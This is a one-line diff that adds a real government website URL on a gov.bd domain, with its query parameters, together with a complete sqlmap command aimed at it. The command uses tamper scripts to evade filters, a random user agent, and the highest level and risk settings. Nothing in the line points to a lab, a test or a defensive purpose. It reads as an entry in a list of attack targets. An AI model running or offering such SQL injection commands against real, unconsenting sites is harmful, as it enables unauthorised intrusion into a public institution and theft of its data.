@@ -1,0 +1,1 @@
+https://www.ndre.sreda.gov.bd/index.php?id=06&kid=3779 (GET)  # sqlmap.py -u https://www.ndre.sreda.gov.bd/index.php?id=06&kid=3779 --batch --banner --tamper=between,randomcase,space2comment --random-agent --level=5 --risk=3
